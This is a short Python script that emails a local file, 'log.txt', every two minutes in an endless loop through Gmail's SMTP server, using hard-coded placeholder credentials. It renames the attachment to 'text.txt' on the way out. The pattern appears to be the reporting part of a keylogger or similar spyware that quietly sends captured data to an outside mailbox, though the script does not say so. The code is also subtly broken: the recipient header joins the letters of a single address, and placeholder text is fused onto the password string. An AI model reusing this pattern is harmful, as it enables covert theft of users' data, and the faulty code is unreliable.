import smtplib, ssl
from pathlib import Path
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
# from email.utils import COMMASPACE, formatdate
from email import encoders
import time
port = 587  # For starttls
smtp_server = "smtp.gmail.com"
sender_email = "sender@gmail.com"
receiver_email = "reciever@gmail.com"
password = "xxxx xxxx xxxx xxxx" """enter 16 digit app password here"""
message = """\
Subject: Hi there

This message is sent from Python."""

SUBJECT = "Email Data"

msg = MIMEMultipart()
msg['Subject'] = SUBJECT
msg['From'] = sender_email
msg['To'] = ', '.join(receiver_email)

part = MIMEBase('application', "octet-stream")
part.set_payload(open("log.txt", "rb").read())
encoders.encode_base64(part)

part.add_header('Content-Disposition', 'attachment; filename="text.txt"')

msg.attach(part)

server = smtplib.SMTP(smtp_server,port)
server.starttls()
server.login(sender_email,password)
while(True):
    server.sendmail(sender_email, receiver_email, msg.as_string())
    time.sleep(120)